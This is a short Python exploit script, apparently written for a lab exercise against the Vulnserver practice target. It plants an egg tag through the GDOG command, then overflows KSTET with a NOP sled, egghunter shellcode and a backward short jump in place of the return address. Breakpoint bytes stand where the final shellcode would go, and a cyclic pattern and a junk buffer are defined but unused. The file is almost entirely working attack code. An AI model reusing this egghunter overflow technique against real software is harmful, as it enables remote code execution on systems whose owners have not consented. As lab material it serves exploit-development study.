import socket 


#   00B7FA08   6A6E6658  Xfnj   esp  70  
#   00B7FA0C   4B314C30  0L1K   esp     74

#first we need to send our egg using GDOG 

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.117.128',9999))

req = 'GDOG ' + 'w00tw00t' + '\xcc'*4
payload = req
payload = payload.encode('raw_unicode_escape')

s.send(payload)

junk = 'A'*2000
pattern = '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'

req = 'KSTET ' 
egghunter = '\x90'*8
egghunter += "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"+\
        "\x77\x30\x30\x74" + "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

space = '\x90'*(70-len(egghunter))

#   \xeb\0xba   jump backwards 70 bytes 
eip = '\xeb\xba'


payload = req + egghunter + space + eip 
payload = payload.encode('raw_unicode_escape')


s.send(payload)

s.close()

